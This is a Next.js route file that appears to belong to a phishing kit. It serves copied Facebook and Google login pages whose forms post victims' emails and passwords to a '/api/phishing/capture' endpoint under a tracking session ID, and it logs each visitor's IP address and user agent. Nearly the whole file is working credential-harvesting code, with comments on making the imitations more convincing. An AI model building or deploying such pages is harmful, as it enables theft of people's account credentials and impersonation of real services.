// app/phish/[sessionId]/page.js
import { getSession } from "../../../lib/phishingStore"; // Adjust path
import { headers } from 'next/headers';
import { notFound } from 'next/navigation'; // Use notFound for invalid sessions

// --- Phishing Templates (HTML Strings) ---
// Keep these simple and self-contained. Use actual copied HTML/CSS for better results.
const templates = {
    'facebook': `
        <!DOCTYPE html><html><head><title>Facebook - Log In</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:Helvetica,Arial,sans-serif;background-color:#f0f2f5;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background-color:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);text-align:center;width:90%;max-width:396px}.logo{width:112px;margin:-20px auto 10px}input{width:calc(100% - 24px);padding:14px 12px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px}button{width:100%;padding:12px;background-color:#1877f2;border:none;border-radius:6px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}button:hover{background-color:#166fe5}a{color:#1877f2;text-decoration:none;font-size:14px;display:block}hr{border:none;border-top:1px solid #dddfe2;margin:20px 16px}.create-btn{background-color:#42b72a;font-size:17px;padding:12px;margin-top:10px} .create-btn:hover{background-color:#36a420}</style></head><body><div class="container"><img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"><form action="/api/phishing/capture" method="POST"><input type="hidden" name="sessionId" value="SESSION_ID_PLACEHOLDER"><input type="text" name="email" placeholder="Mobile number or email address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button><a href="#">Forgotten password?</a><hr><button type="button" class="create-btn">Create New Account</button></form></div></body></html>`,
    'google': `
        <!DOCTYPE html><html><head><title>Sign in - Google Accounts</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>body{font-family:'Google Sans',Roboto,Arial,sans-serif;background-color:#fff;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;width:100%;max-width:400px;box-sizing:border-box}img{display:block;width:75px;margin:0 auto 15px}h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 8px}p{font-size:16px;text-align:center;margin:0 0 25px;color:#202124}input{width:calc(100% - 32px);padding:13px 15px;margin-bottom:24px;border:1px solid #ccc;border-radius:4px;font-size:16px}input:focus{border-color:#1a73e8;outline:none;box-shadow:0 0 0 1px #1a73e8 inset}a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}.actions{display:flex;justify-content:space-between;align-items:center;margin-top:10px}.next-btn{background-color:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}.next-btn:hover{background-color:#1558b0}</style></head><body><div class="container"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"><h1>Sign in</h1><p>Use your Google Account</p><form action="/api/phishing/capture" method="POST"><input type="hidden" name="sessionId" value="SESSION_ID_PLACEHOLDER"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><div class="actions"><a href="#">Forgot password?</a><button type="submit" class="next-btn">Next</button></div><div style="margin-top:40px;text-align:center"><a href="#">Create account</a></div></form></div></body></html>`,
    // Add more templates...
};

// Server Component to fetch session data and render the template
export default async function PhishPage({ params }) {
    const { sessionId } = params;
    const session = getSession(sessionId);

    // Log visit attempt (server-side)
    const headersList = headers();
    const ip = headersList.get('x-forwarded-for')?.split(',')[0].trim() || 'Unknown IP';
    const userAgent = headersList.get('user-agent') || 'Unknown UA';
    console.log(`[Phish Page] Visit attempt: sessionId=${sessionId}, IP=${ip}, UA=${userAgent}`);

    if (!session || session.status !== 'active') {
        console.log(`[Phish Page] Invalid or inactive session requested: ${sessionId}`);
        notFound(); // Render Next.js 404 page
    }

    // Find the HTML template, default if not found
    const templateHtml = templates[session.templateId] || templates['google'] || `<html><body><h1>Template not found</h1></body></html>`;

    // Inject the sessionId into the hidden form field
    const finalHtml = templateHtml.replace(/SESSION_ID_PLACEHOLDER/g, sessionId);

    // Return raw HTML using dangerouslySetInnerHTML on a basic structure
    return (
        <html lang="en">
            <head>
                {/* Minimal head, title etc. are in the template string */}
            </head>
            <body>
                 {/* Use a div wrapper and dangerouslySetInnerHTML */}
                 {/* This avoids conflicts with Next.js own html/body structure */}
                 <div dangerouslySetInnerHTML={{ __html: finalHtml }} />
            </body>
        </html>
    );
}

// Ensure the route is always dynamically rendered
export const dynamic = 'force-dynamic';